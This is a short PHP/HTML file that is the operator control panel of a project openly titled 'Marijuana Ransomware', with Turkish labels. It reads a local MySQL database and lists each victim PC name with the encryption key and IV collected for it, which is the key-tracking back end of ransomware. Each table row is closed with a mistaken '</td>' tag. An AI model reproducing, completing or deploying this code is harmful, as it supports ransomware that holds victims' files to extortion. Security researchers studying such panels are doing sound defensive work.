<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Marijuana Ransomware - Kontrol Panel</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

<table cellpadding="0" cellspacing="0">
	<tr>
		<th>PC ismi</th>
		<th>Key</th>
		<th>IV</th>
	</tr>
	
	<?php
		$baglanti = new PDO("mysql:host=localhost;dbname=marijuana_ransomware", "root", "");
		$sorgu = $baglanti->prepare("SELECT * FROM bilgiler");
		$sorgu->execute();
		
		foreach($sorgu as $bilgi) {
			echo "<tr>";
			echo "<td>".$bilgi["pc_ismi"]."</td>";
			echo "<td>".$bilgi["_key"]."</td>";
			echo "<td>".$bilgi["iv"]."</td>";
			echo "</td>";
		}
		$baglanti = null;
	?>
</table>

<img id="marijuana" src="images/marijuana.png">

</body>
</html>